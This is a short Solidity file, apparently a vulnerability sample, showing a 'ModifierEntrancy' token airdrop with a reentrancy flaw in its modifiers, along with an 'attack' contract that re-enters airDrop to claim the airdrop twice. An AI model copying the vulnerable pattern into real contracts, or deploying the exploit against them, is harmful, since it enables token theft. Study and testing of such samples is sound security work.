pragma solidity ^0.4.24;
contract ModifierEntrancy {
	mapping(address => uint) public tokenBalance;
	string constant name = "Nu Token";
	modifier hasNoBalance(){
	require(tokenBalance[msg.sender] == 0);
	_;}
	function airDrop() hasNoBalance supportsToken public {
	tokenBalance[msg.sender] += 20;
	}
	modifier supportsToken(){
	require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
	_;}
	
}contract Bank {
	function supportsToken() pure external returns(bytes32 ){
	return (keccak256(abi.encodePacked("Nu Token")));
	}
	
}contract attack {
	bool hasBeenCalled;
	function supportsToken() external returns(bytes32 ){
	if(! hasBeenCalled){
	hasBeenCalled = true;
	ModifierEntrancy(msg.sender).airDrop();
	}
	return (keccak256(abi.encodePacked("Nu Token")));
	}
	function call(address token) public {
	ModifierEntrancy(token).airDrop();
	}
	
}